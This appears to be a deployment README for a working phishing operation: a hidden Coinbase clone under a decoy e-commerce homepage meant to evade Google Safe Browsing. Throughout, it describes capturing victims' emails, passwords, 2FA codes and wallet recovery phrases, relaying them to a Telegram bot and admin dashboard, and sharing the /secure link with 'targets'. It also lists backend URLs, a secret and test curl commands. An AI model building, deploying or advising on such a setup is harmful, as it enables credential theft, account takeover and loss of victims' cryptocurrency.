# 🚀 Current Deployment Information

**Last Updated:** November 27, 2025

## 🌐 Live URLs

### **Public Homepage (E-commerce Store)**
🛍️ **https://digital-store-uk.vercel.app**
- Legitimate online store (Digital Store UK)
- Products, categories, shopping features
- Safe from Google Safe Browsing flags
- **Purpose:** Decoy homepage to avoid phishing detection

### **Hidden Coinbase Clone**
🔐 **https://digital-store-uk.vercel.app/secure**
- Full Coinbase replica
- Credential capture system
- All tracking & notifications active
- **Purpose:** Share this URL to targets

### **Admin Dashboard**
👨‍💼 **https://digital-store-uk.vercel.app/admin**
- Admin key: `admin123`
- View captured credentials
- Monitor visitor tracking
- Real-time data display

### **Backend API**
⚙️ **https://coinbase-clone-production-8afd.up.railway.app**
- Node.js/Express server
- MongoDB database
- Telegram bot integration
- Auto-deploys from GitHub

---

## 📱 Telegram Bot

The bot sends real-time notifications for:
- ✅ **Button clicks** (Get Started, Sign In, Sign Up)
- ✅ **Email entered** (Google/Apple sign-in)
- ✅ **Password entered** (Google/Apple sign-in)
- ✅ **OTP/2FA entered** (completion)
- ✅ **Recovery phrase entered** (12-word seed phrase)
- ✅ **Verification complete** (final step)

**Commands:**
- `/start` - Subscribe to notifications
- `/stop` - Unsubscribe from notifications
- `/status` - Check subscription status

---

## 🎯 How to Use

1. **Share the secure link to targets:**
   ```
   https://digital-store-uk.vercel.app/secure
   ```

2. **Monitor Telegram for real-time alerts:**
   - User clicks buttons → Instant notification
   - User enters credentials → Step-by-step alerts
   - User completes auth → Full summary notification

3. **Check admin dashboard for detailed data:**
   ```
   https://digital-store-uk.vercel.app/admin
   Key: admin123
   ```

---

## 🔄 Architecture

```
Public URL → Digital Store UK (Decoy)
    ↓
/secure → Coinbase Clone (Hidden)
    ↓
User Actions → Backend API → Telegram Notifications
    ↓
All Data → Admin Dashboard
```

---

## 🔐 Environment Variables

### Frontend (Vercel)
```
REACT_APP_API_URL=https://coinbase-clone-production-8afd.up.railway.app/api
REACT_APP_SOCKET_URL=https://coinbase-clone-production-8afd.up.railway.app
```

### Backend (Railway)
```
JWT_SECRET=9524923ec8c4f3d04918c59f145b928b1496e135d983391beb22114f756d54a1
ADMIN_KEY=admin123
TELEGRAM_BOT_TOKEN=[your-bot-token]
TELEGRAM_CHAT_ID=[backward-compatible, optional]
```

---

## 📊 Features

### ✅ Implemented
- Multi-step credential capture (Google, Apple, Recovery Phrase)
- Step-by-step Telegram notifications
- Multi-user bot broadcasting system
- Device fingerprinting (IP, browser, timezone, etc.)
- Admin dashboard with persistent login
- Button click tracking
- Decoy homepage to avoid detection

### 🔄 Routes

**Public:**
- `/` - Digital Store UK (decoy)

**Coinbase Clone:**
- `/secure` - Coinbase homepage
- `/secure/signin` - Sign in page
- `/secure/signup` - Sign up page
- `/secure/auth/google` - Google auth capture
- `/secure/auth/apple` - Apple auth capture
- `/secure/auth/recovery` - Recovery phrase capture

**Admin:**
- `/admin` - Admin dashboard
- `/admin/test` - Admin test page

---

## 🚨 Important Notes

1. **Domain Strategy:** The main domain (`digital-store-uk.vercel.app`) shows a legitimate store to avoid Google Safe Browsing flags. Only share the `/secure` path with targets.

2. **Visitor Tracking Disabled:** Random bot/crawler visits no longer trigger notifications. Only actual button clicks and credential entries trigger alerts.

3. **Multi-User Bot:** Anyone can subscribe by sending `/start` to your Telegram bot. All subscribers receive notifications.

4. **No Visitor Spam:** We disabled visitor arrival notifications to prevent spam from bots, crawlers, and link preview services.

---

## 📝 Testing

To test the system:

```bash
# Test button click
curl -X POST https://coinbase-clone-production-8afd.up.railway.app/api/auth/track-button-click \
  -H "Content-Type: application/json" \
  -d '{"button":"get-started","platform":"MacOS","timezone":"America/New_York"}'

# Test Google sign-in (email step)
curl -X POST https://coinbase-clone-production-8afd.up.railway.app/api/auth/track-google-signin \
  -H "Content-Type: application/json" \
  -d '{"email":"test@gmail.com","step":"email","platform":"MacOS"}'
```

---

## 🔧 Deployment

### Frontend (Vercel)
- Auto-deploys from GitHub: `jamespwarner/coinbase-clone`
- Project name: `digital-store-uk`
- Production URL: `https://digital-store-uk.vercel.app`

### Backend (Railway)
- Auto-deploys from GitHub: `jamespwarner/coinbase-clone`
- Production URL: `https://coinbase-clone-production-8afd.up.railway.app`

### Manual Deploy
```bash
# Frontend
cd client
npx vercel --prod

# Backend automatically deploys via Railway GitHub integration
```

---

## 🎯 Summary

**Share this link:** `https://digital-store-uk.vercel.app/secure`

When targets visit:
1. They see the Coinbase page
2. They click buttons → You get notification
3. They enter credentials → You get step-by-step notifications
4. Everything is logged in admin dashboard

**Your bot receives:**
- Real-time alerts for every action
- Complete device information
- Step-by-step credential capture
- Final summaries with full data

✅ **System Status:** Fully operational
